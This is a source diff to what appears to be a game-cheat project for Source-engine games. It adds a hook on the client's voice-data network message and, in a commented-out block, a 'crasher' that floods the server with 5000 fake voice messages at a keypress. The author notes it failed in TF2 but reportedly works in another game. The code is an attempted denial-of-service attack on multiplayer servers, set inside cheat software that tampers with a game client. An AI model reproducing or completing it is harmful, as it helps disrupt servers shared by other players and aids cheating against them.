@@ -8,6 +8,9 @@
 #include <sdk/player.hh>
 #include <sdk/sdk.hh>
 
+#include <sdk/hooks.hh>
+#include <sdk/log.hh>
+
 using namespace sdk;
 
 namespace misc {
@@ -79,8 +82,71 @@ Convar<bool> doghook_misc_show_aa{"doghook_misc_show_aa", true, nullptr};
 
 math::Vector last_viewangles;
 
+struct CLC_VoiceData {
+    int              VTable;
+    bool             reliable;
+    NetChannel *     netchan;
+    int              field_C;
+    int              field_10;
+    int              m_nLength;
+    bf_read          m_DataIn;
+    bf_write         m_DataOut;
+    unsigned __int64 m_xuid;
+};
+
+std::unique_ptr<hooks::HookFunction<CLC_VoiceData, 0>> clc_voicedata_hook;
+
+#if doghook_platform_windows()
+bool __fastcall hooked_write_to_buffer(CLC_VoiceData *msg, void *, bf_write *buf)
+#else
+bool hooked_write_to_buffer(CLC_VoiceData *msg, bf_write *buf)
+#endif
+{
+    auto old_curbit = buf->m_iCurBit;
+    auto ret        = clc_voicedata_hook->call_original<bool>(buf);
+    auto new_curbit = buf->m_iCurBit;
+
+    using writeword_fn = void(__thiscall *)(bf_write *, u16);
+    //buf->m_iCurBit  = old_curbit + 6;
+    static writeword_fn writeword = (writeword_fn)signature::resolve_callgate(signature::find_pattern("engine", "E8 ? ? ? ? FF 76 14 8B CB"));
+    //writeword(buf, 2);
+    //msg->m_nLength = 0;
+    //buf->m_iCurBit = new_curbit;
+
+    return ret;
+}
+
+// all of this """crasher""" didn't work for TF2, but Dmitriy says it works in CSS
+// i also trieed to fake the length of it, didn't work
+
 void create_move(sdk::UserCmd *cmd) {
     last_viewangles = cmd->viewangles;
+    /*if (iface::input_system->is_button_down(ButtonCode::KEY_F)) {
+        static CLC_VoiceData *msg = (CLC_VoiceData *)calloc(sizeof(CLC_VoiceData), 1); // size should be 80|0x50
+        memset(msg, 0, sizeof(CLC_VoiceData));
+        if (!msg->VTable) {
+            static auto msgvtable = *(u32 *)(signature::find_pattern("engine", "C7 06 ? ? ? ? E8 ? ? ? ? 8D 4E 30") + 2);
+            msg->VTable           = msgvtable;
+            //clc_voicedata_hook = std::make_unique<hooks::HookFunction<CLC_VoiceData, 0>>(msg, 5, -1, -1, reinterpret_cast<void *>(&hooked_write_to_buffer));
+        }
+        //bf_write__ctor((u32 *)&msg->m_DataIn);
+        //bf_write__ctor((u32 *)&msg->m_DataOut);
+
+		auto netchan = iface::engine->net_channel_info();
+
+		//char voicedata[2048]{0};
+        bf_write__start_writing(&msg->m_DataOut, "lllllll", 2048, 0, 0xFFFFFFFF);
+                //bf_write__start_writing(&msg->m_DataIn, "l", sizeof("l"), 0, 0xFFFFFFFF);
+        msg->m_DataOut.m_iCurBit = sizeof("lllllll") * 8;
+        //msg->m_nLength = sizeof("lllllll")*8;
+        //msg->m_nLength = 0;
+        msg->reliable  = 0;
+        msg->netchan   = netchan;
+        //logging::msg("%i", msg->m_DataOut.m_iCurBit
+        for (u32 i = 0; i < 5000; i++)
+            netchan->send_net_msg(msg);
+        //logging::msg("%i", msg->m_DataOut.m_iCurBit);
+    }*/
 }
 
 void update(float frametime) {
